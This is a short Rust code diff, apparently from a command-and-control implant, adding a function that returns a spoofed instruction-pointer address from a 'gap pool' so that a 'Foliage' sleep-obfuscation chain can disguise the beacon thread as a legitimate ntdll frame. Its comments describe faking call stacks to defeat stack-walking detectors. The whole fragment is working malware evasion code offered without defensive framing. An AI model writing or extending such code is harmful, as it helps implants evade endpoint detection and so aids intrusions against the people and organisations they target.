@@ -118,6 +118,16 @@ fn global_gap_pool() -> Option<&'static GapPool> {
     }
 }
 
+/// Get a spoof RIP from the gap pool (first gap address). Used by the Foliage
+/// APC chain to set the beacon thread's CONTEXT.RIP to a fake .pdata-gap address
+/// during sleep — stack-walking detectors see a legitimate ntdll leaf, not the
+/// implant. Returns None if the gap pool isn't populated.
+pub fn gap_pool_rip() -> Option<u64> {
+    global_gap_pool()
+        .filter(|p| !p.gaps.is_empty())
+        .map(|p| p.gaps[0] as u64)
+}
+
 /// A staged fake call-stack: the synthesized leaf-gap bridge chain, written
 /// into an implant-owned buffer as a sequence of 8-byte return-address slots.
 /// The innermost (most-recent) return address is at the lowest address, so the
